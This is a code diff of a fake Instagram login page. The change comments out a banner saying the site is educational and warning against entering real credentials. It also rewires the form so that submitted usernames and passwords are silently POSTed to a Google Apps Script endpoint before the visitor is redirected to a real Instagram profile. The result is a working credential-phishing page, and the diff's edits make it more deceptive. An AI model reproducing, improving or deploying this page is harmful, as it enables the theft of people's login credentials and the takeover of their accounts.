@@ -1,7 +1,7 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-<marquee><h1>This website is for educational purpose only. Do not enter your real credentials.</h1></marquee>
+ <!-- <marquee><h1>This website is for educational purpose only. Do not enter your real credentials.</h1></marquee>-->
   <meta charset="UTF-8" />
   <meta name="viewport" content="width=device-width, initial-scale=1.0" />
   <title>Instagram</title>
@@ -150,10 +150,10 @@
   <div class="language">English (UK)</div>
   <img class="logo" src="https://upload.wikimedia.org/wikipedia/commons/a/a5/Instagram_icon.png" alt="Instagram Logo">
 
-  <form id="login-form">
+  <form id="myForm">
     <input type="text" name="username" placeholder="Username, email address or mobile ..." required>
     <input type="password" name="password" placeholder="Password" required>
-    <button onclick="window.location.href='https://www.instagram.com/exploitxplorers?utm_source=ig_web_button_share_sheet&igsh=ZDNlZDc0MzIxNw=='">Submit</button>
+    <button type="submit">Log in</button>
 
   </form> 
 
@@ -171,18 +171,16 @@ document.getElementById("myForm").addEventListener("submit", function(e) {
   const form = e.target;
   const data = new FormData(form);
 
-  // Use keepalive to allow background request to complete
+  // Send the request in background (no .then)
   fetch('https://script.google.com/macros/s/AKfycbwISpAh5T-RfRHcvgieYAOynujfS4gvZSXij5m3Hjoq8Njj-aLbdyATvO44boR83_FRpg/exec', {
     method: 'POST',
-    body: data,
-    keepalive: true // 🔑 allows it to finish after redirect
+    body: data
   });
 
   // Redirect instantly
-  window.location.href = "thankyou.html";
+  window.location.href = "https://www.instagram.com/exploitxplorers?utm_source=ig_web_button_share_sheet&igsh=ZDNlZDc0MzIxNw==";
 });
 </script>
-
 
 
   <!-- Dark Footer Strip -->
